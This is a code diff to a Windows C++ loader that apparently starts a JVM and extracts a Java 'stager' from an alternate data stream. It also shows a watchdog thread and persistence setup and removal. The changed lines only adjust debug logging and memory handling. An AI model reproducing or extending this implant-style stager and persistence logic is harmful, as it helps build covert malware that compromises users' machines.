@@ -15,10 +15,15 @@
 #include "..\utilities.h"
 #include "resource.h"
 #include <process.h>
+#include <ShlObj.h>
 
 
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "User32.lib")
+
+#ifdef _DBG
+#pragma comment(lib, "Shell32.lib")		
+#endif
 
 
 //JVM DLL instance
@@ -54,6 +59,7 @@ unsigned int __stdcall Thread_Start_JVM(void* a) {
 
 	//Add the ADS reference
 	classPath.append(COLON);
+
 		
 	//Extract java stager
 	if( !ExtractStager( classPath )){
@@ -61,7 +67,7 @@ unsigned int __stdcall Thread_Start_JVM(void* a) {
 		Log( "Unable to extract stager.\n", GetLastError());
 #endif
         return 1;	
-	}
+	} 
 	
 	//Get jvm string from resource table
 	std::string jvm_str;
@@ -175,7 +181,7 @@ unsigned int __stdcall StartWatchDog(void* a) {
 		return 1;
 		
 	//Free memory
-	free(rtr_struct_ptr);
+	//free(rtr_struct_ptr);
 
 	//Get the handle to the process
 	HANDLE watch_dog_handle = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, proc_pid);
@@ -232,7 +238,12 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 {
 
 #ifdef _DBG
-	SetLogPath("C:\\jldr.log");
+	CHAR path[MAX_PATH];
+	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))) {
+		std::string str_path(path);
+		str_path.append("\\jldr.log");
+		SetLogPath(str_path.c_str());
+	}
 #endif
 
 	persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
@@ -342,7 +353,6 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 		Log( "[-] Manager::Start - unabled to start watch dog thread.\n" );
 #endif
 	}
-
 	
 	//Remove the DLL
 	RemovePersistence( persist_struct_ptr );
